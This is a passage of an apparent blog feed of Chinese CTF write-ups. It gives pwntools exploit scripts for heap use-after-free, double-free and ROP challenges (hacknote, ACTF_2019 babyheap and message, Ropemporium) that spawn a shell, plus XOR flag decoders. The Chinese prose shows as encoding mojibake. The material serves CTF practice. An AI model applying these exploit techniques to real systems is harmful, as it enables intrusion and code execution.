class="hljs-string">'printf'</span>,read)libc_base = read - libc.symbols[<span class="hljs-string">'read'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)binsh = libc_base  + libc.search(<span class="hljs-string">"/bin/sh"</span>).next()system = libc_base + libc.sym[<span class="hljs-string">'system'</span>]sla(<span class="hljs-string">'how long is your name: '</span>,<span class="hljs-string">'500'</span>)payload = <span class="hljs-string">'\x00'</span> * offset + flat([ret,pop_rdi,binsh,system])<span class="hljs-comment"># rec = 0x4f322 + libc_base</span><span class="hljs-comment"># dbg()</span>sla(<span class="hljs-string">'s you name?'</span>,payload)itr()</code></pre></div><h2 id="å…¥é—¨reverse"><a href="#å…¥é—¨reverse" class="headerlink" title="å…¥é—¨reverse"></a>å…¥é—¨reverse</h2><div class="hljs"><pre><code class="hljs python">s = <span class="hljs-string">'akhb~chdaZrdaZudqduvdZvvv|'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">26</span>):    flag += chr((ord(s[i]) - <span class="hljs-number">1</span>) ^ <span class="hljs-number">6</span>)print(flag)</code></pre></div><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>ç›´æ¥çˆ†ç ´äº†ã€‚</p><div class="hljs"><pre><code class="hljs python">s = [<span class="hljs-number">38</span>,<span class="hljs-number">44</span>,<span class="hljs-number">33</span>,<span class="hljs-number">39</span>,<span class="hljs-number">59</span>,<span class="hljs-number">35</span>,<span class="hljs-number">34</span>,<span class="hljs-number">115</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">113</span>,<span class="hljs-number">33</span>,<span class="hljs-number">36</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">35</span>,<span class="hljs-number">120</span>,<span class="hljs-number">38</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">113</span>,<span class="hljs-number">38</span>,<span class="hljs-number">34</span>,<span class="hljs-number">113</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">36</span>,<span class="hljs-number">112</span>,<span class="hljs-number">115</span>,<span class="hljs-number">118</span>,<span class="hljs-number">121</span>,<span class="hljs-number">112</span>,<span class="hljs-number">35</span>,<span class="hljs-number">37</span>,<span class="hljs-number">121</span>,<span class="hljs-number">61</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>):    flag = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">38</span>):        flag += chr(s[j] ^ i)    <span class="hljs-keyword">if</span> flag[:<span class="hljs-number">4</span>] == <span class="hljs-string">'flag'</span>:        print(flag)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
      <tag>rop</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uafå’Œdouble free</title>
    <link href="/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <url>/2020/04/25/uaf%E5%92%8Cdouble%20free/</url>
    
    <content type="html"><![CDATA[<h1 id="uafå’Œdouble-free"><a href="#uafå’Œdouble-free" class="headerlink" title="uafå’Œdouble free"></a>uafå’Œdouble free</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¼€å§‹æ‰“ç®—å…¥é—¨å †ï¼Œç®€å•è®°å½•å‡ é“ç›¸å…³çš„é¢˜ã€‚</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>é¢˜ç›®è¾ƒä¸ºç®€å•å­˜åœ¨åé—¨å‡½æ•°ï¼Œåˆ©ç”¨uafæ¼æ´æ”»å‡»å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./hacknote'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27892</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sl(<span class="hljs-string">'1'</span>)    ru(<span class="hljs-string">'Note size '</span>)    sl(str(size))    ru(<span class="hljs-string">'Content :'</span>)    sl(str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sl(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sl(str(index))ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-string">'aaaa'</span>)ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-string">'bbbb'</span>)ru(<span class="hljs-string">'Your choice :'</span>)dele(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'Your choice :'</span>)dele(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">8</span>,p32(elf.symbols[<span class="hljs-string">'magic'</span>]))ru(<span class="hljs-string">'Your choice :'</span>)show(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>é¢˜ç›®æœ‰systemå‡½æ•°ï¼Œå¹¶ä¸”ä¹Ÿæœ‰<code>/bin/sh\x00</code> ï¼Œå½“æ—¶åœ¨æ„é€ è¿™ä¸ª<code>/bin/sh\x00</code>çš„å­—ç¬¦ä¸²æŒ‡é’ˆçš„æ—¶å€™è´¹äº†ä¸€ç‚¹åŠ²ï¼Œç»“æœå‘ç°elfæœ‰è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶åå°±å¾ˆç®€å•äº†ï¼Œæ§åˆ¶å¥½å‚æ•°å³å¯ã€‚è¿˜æ˜¯uafæ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./ACTF_2019_babyheap'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>debug = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27341</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'Your choice: '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size: \n'</span>,str(size))    sa(<span class="hljs-string">'content: \n'</span>,str(content)) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index: \n'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'3'</span>)sla(<span class="hljs-string">'index: \n'</span>,str(index))add(<span class="hljs-number">32</span>,<span class="hljs-string">'aaaaaaaa'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">32</span>,<span class="hljs-string">'bbbbbbbb'</span>) <span class="hljs-comment">#1</span>dele(<span class="hljs-number">0</span>)dele(<span class="hljs-number">1</span>)binsh = <span class="hljs-number">0x602010</span>add(<span class="hljs-number">16</span>,flat(binsh,elf.plt[<span class="hljs-string">'system'</span>]))<span class="hljs-comment"># dbg()</span>show(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double freeï¼Œè¿ç§»åˆ°ä¼ªé€ çš„å †å—ï¼Œæ³¨æ„æ§åˆ¶å¥½ä¼ªé€ å †å—çš„sizeè·Ÿfastbinçš„å¯¹åº”ã€‚<br>æ”¹<code>__free_hook</code>ä¸ºsystemå³å¯ã€‚<code>__free_hook</code>çš„å‚æ•°æ­£å¥½æ˜¯å †å—çš„dateï¼Œè¾ƒå¥½æ§åˆ¶ã€‚<br>ï¼ˆbuuç»™çš„å¤ç°ç¯å¢ƒæ˜¯18çš„ï¼Œæœ‰äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æœ¬äººè¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œåªæ˜¯çŸ¥é“ä¸æ£€æŸ¥sizeæ˜¯å¦å¯¹åº”äº†ï¼Œåœ¨16ä¸Šåšçš„ï¼Œç„¶åå°±è°ƒè¯•æ”¹äº†æ”¹è„šæœ¬ï¼Œæ‰“é€šäº†buuçš„å¤ç°ç¯å¢ƒã€‚ä¸‹é¢çš„expä¹Ÿæ˜¯18çš„ã€‚ï¼‰</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./ACTF_2019_message'</span><span class="hljs-comment"># local_libc  = '/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="hljs-comment"># remote_libc = local_libc # '../libc.so.6'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    <span class="hljs-comment"># libc = ELF(local_libc)</span><span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25390</span>)    <span class="hljs-comment"># libc = ELF(remote_libc)</span>elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length,contend)</span> :</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'length of message:\n'</span>,str(length))    sa(<span class="hljs-string">'message:\n'</span>,str(contend))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'to delete:\n'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,contend)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'to edit:\n'</span>,str(index))    sa(<span class="hljs-string">'the message:\n'</span>,str(contend))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'to display:\n'</span>,str(index))add(<span class="hljs-number">0x30</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#2</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x602068</span>))add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)contend = p64(elf.got[<span class="hljs-string">'puts'</span>])<span class="hljs-comment"># + p64(0x30) + p64(elf.got['puts'])</span>add(<span class="hljs-number">0x20</span>,contend)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">' message: '</span>)puts = uu64(r(<span class="hljs-number">6</span>))libc_base = puts - libc.symbols[<span class="hljs-string">'puts'</span>]free_hook = libc_base + libc.symbols[<span class="hljs-string">'__free_hook'</span>]print(<span class="hljs-string">'puts'</span> + hex(puts))print(<span class="hljs-string">'libc_base'</span> + hex(libc_base))system = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]contend = p64(free_hook)dbg()edit(<span class="hljs-number">6</span>,contend)<span class="hljs-comment"># dbg()</span>contend = p64(system)edit(<span class="hljs-number">0</span>,contend)<span class="hljs-comment"># dbg()</span>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">7</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwntoolsçš„gdb.attach</title>
    <link href="/2020/04/20/pwntools%E7%9A%84gdb.attach/"/>
    <url>/2020/04/20/pwntools%E7%9A%84gdb.attach/</url>
    
    <content type="html"><![CDATA[<h1 id="pwntoolsçš„gdb-attach"><a href="#pwntoolsçš„gdb-attach" class="headerlink" title="pwntoolsçš„gdb.attach"></a>pwntoolsçš„gdb.attach</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨å°è¯•å­¦ç€æ›´å¿«çš„è°ƒè¯•expï¼Œå¾ˆæ—©å°±äº†è§£åˆ°è¿™ä¸ªgdb.attachï¼Œä½†æ˜¯æœ¬äººæ˜¯sshè¿ä¸Šå»çš„ï¼Œæ ¹æœ¬ç”¨ä¸äº†ã€‚ç„¶åå°è¯•tmuxè¿™ä¸ªç¥å™¨ï¼Œæ¥å®ç°gdb.attachã€‚æˆåŠŸä»¥åå‘ç°ä¸€ä¸ªä¸å¥½çš„ç‚¹ï¼Œpwntools gdb.attachä¸Šçš„gdbè°ƒè¯•ä¸­ï¼Œå¾ˆå¤šå‡½æ•°æ˜¯æ²¡æœ‰ç¬¦å·è¡¨çš„ï¼Œè°ƒè¯•èµ·æ¥åè€Œéš¾åº¦å¢åŠ ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/QGWqDH.png" srcset="/img/loading.gif" alt><br>è‡ªå·±æ‰‹åŠ¨gdb.attachä¸Šå»ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/acimnJ.png" srcset="/img/loading.gif" alt><br>ç„¶åå‘ç°è°·æ­Œä¹Ÿè°·æ­Œä¸å‡ºæ¥ï¼Œå°±æ¥æŠ˜è…¾æºç äº†ã€‚<br><strong>ç‰ˆæœ¬å· ï¼špwntools (4.0.1)</strong></p><h2 id="æ”¹å–„"><a href="#æ”¹å–„" class="headerlink" title="æ”¹å–„"></a>æ”¹å–„</h2><p>å› ä¸ºæ­£å¸¸æœ¬äººéƒ½æ˜¯</p><div class="hljs"><pre><code class="hljs undefined">chumen77<span class="hljs-variable">@chumen</span>-<span class="hljs-number">77</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>gdb at pid</code></pre></div><p>è¿™æ ·æ¥è¿›è¡Œattachã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/JxHuUC.png" srcset="/img/loading.gif" alt><br>å‘ç°ç”¨pwntoolsæ—¶å€™ï¼Œå®ƒè¿›è¡Œçš„å‘½ä»¤æ˜¯è¿™æ ·çš„ï¼Œç„¶åæ€è·¯å°±æ¥äº†æ‰¾åˆ°ç›¸å…³æºç ï¼Œæ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚</p><h3 id="æ‰¾å…³é”®å¤„"><a href="#æ‰¾å…³é”®å¤„" class="headerlink" title="æ‰¾å…³é”®å¤„"></a>æ‰¾å…³é”®å¤„</h3><div class="hljs"><pre><code class="hljs undefined">/running <span class="hljs-keyword">in</span> <span class="hljs-built_in">new</span> <span class="hljs-built_in">terminal</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/8T9BqG.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BlYHnW.png" srcset="/img/loading.gif" alt><br>åˆ é™¤2è¡Œå’Œä¿®æ”¹ä¸€è¡Œä»£ç ï¼ˆ<code>-q æ”¹æˆ at</code>ï¼‰å³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XUD2ZW.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»å¯ä»¥äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ropemporium é€šå…³è®°å½•</title>
    <link href="/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-é€šå…³è®°å½•"><a href="#Ropemporium-é€šå…³è®°å½•" class="headerlink" title="Ropemporium é€šå…³è®°å½•"></a>Ropemporium é€šå…³è®°å½•</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>é¢˜ç›®ç»™äº†æç¤ºï¼Œ32çš„bufå´å¯ä»¥å¡«å……50ä¸ªå­—èŠ‚ã€‚å¹¶ä¸”æ¥å—ç”¨çš„æ˜¯fgetsï¼Œè¿™ä¸ªå‡½æ•°ä¸ç”¨æ‹…å¿ƒç©ºå­—èŠ‚ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ret2win</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Thank you! Here's your flag:"</span>);  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bin/cat flag.txt"</span>);&#125;</code></pre></div><p>å¹¶ä¸”å­˜åœ¨æ¼æ´å‡½æ•°ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./ret2win32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">44</span> + p32(<span class="hljs-number">0x08048659</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./ret2win'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">40</span> + p64(<span class="hljs-number">0x00000400811</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">usefulFunction</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bin/ls"</span>);&#125;</code></pre></div><p>åé—¨å‡½æ•°å˜æˆäº†è¿™æ ·ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æœ‰cat flagçš„å­—ç¬¦ä¸²ã€‚è¿™æ ·åªéœ€è¦æ§åˆ¶systemçš„å‚æ•°å³å¯ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š"><a href="#32ä½ï¼š" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./split32'</span>)key = <span class="hljs-number">0x0804A030</span> <span class="hljs-comment"># /bin/cat flag.txt'</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)offset = <span class="hljs-number">44</span>payload = <span class="hljs-string">'a'</span> * offset + p32(<span class="hljs-number">0x08048657</span>) + p32(<span class="hljs-number">0x0804A030</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64ä½ï¼š"><a href="#64ä½ï¼š" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./split'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)key = <span class="hljs-number">0x00601060</span> <span class="hljs-comment"># /bin/cat flag.txt'</span>offset = <span class="hljs-number">40</span>pop_rdi_ret = <span class="hljs-number">0x0000000000400883</span>payload = <span class="hljs-string">'a'</span> * offset + p64(pop_rdi_ret) + p64(key) + p64(<span class="hljs-number">0x00000400810</span>) io.sendline(payload)io.interactive()</code></pre></div><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">usefulFunction</span><span class="hljs-params">()</span></span>&#123;  callme_three(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);  callme_two(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);  callme_one(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);  <span class="hljs-built_in">exit</span>(<span 